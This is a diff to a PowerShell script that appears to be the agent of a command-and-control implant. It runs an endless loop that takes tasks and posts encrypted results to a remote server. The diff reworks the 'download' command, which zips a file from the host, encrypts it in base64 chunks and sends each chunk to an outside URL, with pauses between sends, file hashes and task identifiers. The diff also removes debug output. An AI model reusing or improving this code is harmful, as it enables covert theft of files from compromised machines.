@@ -231,8 +231,6 @@ for (;;){
                     Invoke-WebRequest -UseBasicParsing -Uri $resultfl -Body $data -Method 'POST'
                 }
             }
-
-            ### dev
             elseif ($command -eq "download"){
                 $file = $args
                 if ( "$file".contains('\') ){
@@ -240,31 +238,25 @@ for (;;){
                 } else {
                     $file_name = $file
                 }
-                write-host $file
-                write-host $file_name
-                if (-not(Test-Path "$file")) {
-                    $res = "VALID file " + "$file_name" + " not found!"
+                if (-not( Test-Path -LiteralPath "$file" -PathType leaf)) {
+                    $res = "VALID - File " + "$file_name" + " not found!"
                     $res  = Encrypt-String $key $res
                     $data    = @{result = "$res"}
                     $resultfl = ("$resultl" + "$taskId")
                     Invoke-WebRequest -UseBasicParsing -Uri $resultfl -Body $data -Method 'POST'
                 } else {
-                    $f_code = Get-FileHash -Algorithm SHA1 -LiteralPath "$file" | Select -ExpandProperty Hash
+                    $f_hash = Get-FileHash -Algorithm SHA1 -LiteralPath "$file" | Select -ExpandProperty Hash
                     $zip_name = "$file" + ".zip"
                     Compress-Archive -LiteralPath "$file" -Force -DestinationPath "$zip_name" -CompressionLevel Optimal
                     $file_bin = Get-Content -Encoding Byte -Raw -Path "$zip_name"
 
                     $lenght = $file_bin.Length
                     $chunks_size = 200
-
-                    write-host $lenght
-                    $init = "VALID init " + "$f_code"
-                    write-host $init
+                    $init = "VALID init " + "$f_hash"
                     $init  = Encrypt-String $key $init
-                     write-host $init
-                    $enc_len = "VALID " + "$lenght.ToSTring()"
+                    $total_chunks = [math]::ceiling($lenght/$chunks_size)
+                    $enc_len = "VALID " + "$total_chunks"
                     $enc_len  = Encrypt-String $key $enc_len
-                    write-host $enc_len
                     $data = @{
                         info = "$init"
                         name = "$name"
@@ -273,49 +265,60 @@ for (;;){
                     $downloadfl = ("$downloadl" + "$file_name")
 
 
-                    ### use file ID instead of f_code !!!!
-                    $file_id = Invoke-WebRequest -UseBasicParsing -Uri $downloadfl -Body $data -Method 'POST' -TimeoutSec 3
+                    ### use file ID instead of f_hash !!!!
+                    $file_id = Invoke-WebRequest -UseBasicParsing -Uri $downloadfl -Body $data -Method 'POST'
+                    $res = Decrypt-String $key $file_id
+                    $flag = $res.split()[0]
                     sleep $n
+                    if ($flag -eq "VALID") {
+                        $fid = $res.split()[1]
+                        $fid = "VALID " + "$fid"
+                        $fid = Encrypt-String $key "$fid"
+                        
+                        $taskId_enc = "VALID " + "$taskId"
+                        $taskId_enc = Encrypt-String $key "$taskId"
 
-                    if ($lenght -le $chunks_size){
-                        $file_b64 = [System.Convert]::ToBase64String($file_bin)
-                        $part = "VALID 0 " + "$f_code"
-                        $part  = Encrypt-String $key "$part"
-                        $content = "VALID " + "$file_b64"
-                        $content  = Encrypt-String $key "$content"
-                        $data = @{
-                            info = "$part"
-                            name = "$name"
-                            chunk = "$content"
-                        }
-                        Invoke-WebRequest -UseBasicParsing -Uri $downloadfl -Body $data -Method 'POST'
-                    } else {
-                        $total_chunks = [math]::ceiling($lenght/$chunks_size)
-                        for ($i=0; $i -le $total_chunks-1; $i++) {
-                            $chunk_b64 = [System.Convert]::ToBase64String($file_bin[($i*$chunks_size)..($i*$chunks_size+199)])
-                            $part = "VALID " + "$i" + " " + "$f_code"
+                        if ($lenght -le $chunks_size){
+                            $file_b64 = [System.Convert]::ToBase64String($file_bin)
+                            $part = "VALID 0 " + "$f_hash"
                             $part  = Encrypt-String $key "$part"
-                            $content = "VALID " + "$chunk_b64"
+                            $content = "VALID " + "$file_b64"
                             $content  = Encrypt-String $key "$content"
                             $data = @{
                                 info = "$part"
                                 name = "$name"
+                                fid = "$fid"
+                                taskid = "$taskId_enc"
                                 chunk = "$content"
                             }
                             Invoke-WebRequest -UseBasicParsing -Uri $downloadfl -Body $data -Method 'POST'
-                            sleep $n
+                        } else {
+                            for ($i=0; $i -lt $total_chunks; $i++) {
+                                $chunk_b64 = [System.Convert]::ToBase64String($file_bin[($i*$chunks_size)..($i*$chunks_size+199)])
+                                $part = "VALID " + "$i" + " " + "$f_hash"
+                                $part  = Encrypt-String $key "$part"
+                                $content = "VALID " + "$chunk_b64"
+                                $content  = Encrypt-String $key "$content"
+                                if ($i -eq $total_chunks-1) {
+                                    $data = @{
+                                        info = "$part"
+                                        name = "$name"
+                                        fid = "$fid"
+                                        chunk = "$content"
+                                        taskid = "$taskId_enc"
+                                    }
+                                } else {
+                                    $data = @{
+                                    info = "$part"
+                                    name = "$name"
+                                    fid = "$fid"
+                                    chunk = "$content"
+                                    }    
+                                }
+                                Invoke-WebRequest -UseBasicParsing -Uri $downloadfl -Body $data -Method 'POST'
+                                sleep $n
+                            }
                         }
-                        # $chunk_b64 = [System.Convert]::ToBase64String($file_bin[$i*$chunks_size..$i*$chunks_size+199])
-                        # $part = "VALID " + "$i"
-                        # $part  = Encrypt-String $key "$part"
-                        # $content = "VALID " + "$chunk_b64"
-                        # $content  = Encrypt-String $key "$content"
-                        # $data = @{
-                        #     info = "$part"
-                        #     name = "$name"
-                        #     chunk = "$content"
-                        # }
-                        # Invoke-WebRequest -UseBasicParsing -Uri $downloadfl -Body $data -Method 'POST'
                     }
 
                 }
@@ -334,3 +337,4 @@ for (;;){
         }
     }
     sleep $n
+}
